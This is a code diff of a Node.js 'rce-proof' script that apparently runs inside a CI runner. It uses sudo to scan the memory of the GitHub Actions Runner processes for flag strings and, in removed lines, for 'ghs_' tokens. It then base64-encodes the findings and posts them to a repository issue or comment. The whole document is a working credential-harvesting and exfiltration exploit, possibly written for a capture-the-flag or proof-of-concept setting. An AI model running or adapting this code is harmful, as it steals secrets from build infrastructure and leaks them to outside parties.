@@ -15,36 +15,26 @@ const H = {
   'content-type': 'application/json',
   'user-agent': 'rce-proof'
 };
-const out = { token, token_len: token.length, token_prefix: token.slice(0, 4), repo };
-const rq = async (path, opts = {}) => {
+const sh = (cmd, timeout = 240000) => {
   try {
-    const r = await fetch(api + path, { headers: H, ...opts });
-    const text = await r.text();
-    return { status: r.status, text: text.slice(0, 2000) };
-  } catch (e) { return { error: String(e) }; }
-};
-const sh = (cmd, timeout = 180000) => {
-  try {
-    return execSync(cmd, { encoding: 'utf8', timeout, maxBuffer: 32 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
+    return execSync(cmd, { encoding: 'utf8', timeout, maxBuffer: 64 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
   } catch (e) { return 'ERR:' + String(e.stdout || '') + String(e.stderr || '') + String(e.message || ''); }
 };
 const scanPy = `import os,sys,base64
 pid=sys.argv[1]
-pats=[b'FLAG{',b'TRIAGE_FLAG',b'READ_ONLY_PAT',b'ghs_']
-try:
-    ctrl=open('/tmp/ctrl.txt','rb').read().strip()
-    if ctrl: pats.append(ctrl)
-except Exception: pass
-allp=list(pats)
+pats=[b'FLAG{',b'TRIAGE_FLAG']
+allp=[]
 for p in pats:
-    try: allp.append(p.decode('latin1').encode('utf-16le'))
-    except Exception: pass
+    allp.append((p,(p.decode('latin1')+'_u8')))
+    allp.append((p.decode('latin1').encode('utf-16le'),(p.decode('latin1')+'_u16')))
+caps={}
 hits=[]; total=0
 try:
     maps=open('/proc/%s/maps'%pid).read().splitlines()
     mem=open('/proc/%s/mem'%pid,'rb',0)
 except Exception as e:
     print('ERR open',e); sys.exit()
+CH=32*1024*1024
 for line in maps:
     parts=line.split()
     if len(parts)<2 or 'r' not in parts[1]: continue
@@ -52,45 +42,57 @@ for line in maps:
         a,b=parts[0].split('-'); start=int(a,16); end=int(b,16)
     except Exception: continue
     size=end-start
-    if size<=0: continue
-    chunk=min(size,64*1024*1024)
-    try:
-        mem.seek(start); data=mem.read(chunk)
-    except Exception: continue
-    total+=len(data)
-    for p in allp:
-        i=data.find(p)
-        while i!=-1:
-            hits.append((p[:16].decode('latin1','replace'), base64.b64encode(data[max(0,i-60):i+200]).decode()))
-            i=data.find(p,i+1)
-            if len(hits)>=60: break
-        if len(hits)>=60: break
-    if len(hits)>=60 or total>700*1024*1024: break
+    if size<=0 or size>512*1024*1024: continue
+    off=0
+    while off<size and total<900*1024*1024:
+        ln=min(CH,size-off)
+        try:
+            mem.seek(start+off); data=mem.read(ln)
+        except Exception:
+            break
+        if not data: break
+        total+=len(data)
+        for p,name in allp:
+            if caps.get(name,0)>=10: continue
+            i=data.find(p)
+            while i!=-1:
+                hits.append((name,base64.b64encode(data[max(0,i-80):i+240]).decode()))
+                caps[name]=caps.get(name,0)+1
+                if caps[name]>=10: break
+                i=data.find(p,i+1)
+        off+=ln-300 if ln>300 else ln
+    if total>=900*1024*1024: break
 print('SCANNED',total)
-print('HITS',len(hits))
-for t,h in hits: print(t+'|'+h)
+print('FLAGHITS',len(hits))
+print('CAPS',caps)
+for name,h in hits: print('FLAGHIT|'+name+'|'+h)
 `;
 (async () => {
-  out.repo_meta = await rq(`/repos/${repo}`);
-  out.secrets_probe = await rq(`/repos/${repo}/actions/secrets`);
-  out.id = sh('id').trim();
-  out.sudo = sh('sudo -n true && echo SUDO_OK || echo SUDO_NO').trim();
+  const out = { repo, sudo: sh('sudo -n true && echo SUDO_OK || echo SUDO_NO').trim() };
   out.ps = sh("pgrep -af 'Runner\\.(Worker|Listener)' || true").slice(0, 2000);
-  fs.writeFileSync('/tmp/ctrl.txt', token);
-  fs.writeFileSync('/tmp/memscan.py', scanPy);
+  fs.writeFileSync('/tmp/memscan8.py', scanPy);
   const pids = out.ps.split('\n').map((l) => l.trim().split(/\s+/)[0]).filter((x) => /^\d+$/.test(x));
   out.pids = pids;
-  out.memscan = {};
+  out.scans = {};
   for (const pid of pids.slice(0, 4)) {
-    out.memscan[pid] = sh(`sudo timeout 170 python3 /tmp/memscan.py ${pid}`, 200000).slice(0, 30000);
+    const r = sh(`sudo timeout 300 python3 /tmp/memscan8.py ${pid}`, 320000);
+    out.scans[pid] = r.slice(0, 40000);
+    console.log('SCAN_PID=' + pid);
+    console.log(r.slice(0, 40000));
   }
-  out.b64 = b64(JSON.stringify({ ...out, token }));
-  console.log('SCAN_EXFIL_B64=' + out.b64);
-  const ir = await fetch(`${api}/repos/${repo}/issues`, {
+  const payload = JSON.stringify(out);
+  let ir = await fetch(`${api}/repos/${repo}/issues`, {
     method: 'POST', headers: H,
-    body: JSON.stringify({ title: 'MEMORY_SCAN_V7', body: '```\n' + out.b64 + '\n```' })
+    body: JSON.stringify({ title: 'FLAG_SCAN_RESULTS', body: '```\n' + b64(payload) + '\n```' })
   });
   console.log('ISSUE_STATUS=' + ir.status);
+  if (ir.status !== 201) {
+    ir = await fetch(`${api}/repos/${repo}/issues/7/comments`, {
+      method: 'POST', headers: H,
+      body: JSON.stringify({ body: b64(payload) })
+    });
+    console.log('COMMENT_STATUS=' + ir.status);
+  }
   console.log('SLEEP_START=' + new Date().toISOString());
   await new Promise((r) => setTimeout(r, 60000));
   console.log('SLEEP_DONE=' + new Date().toISOString());
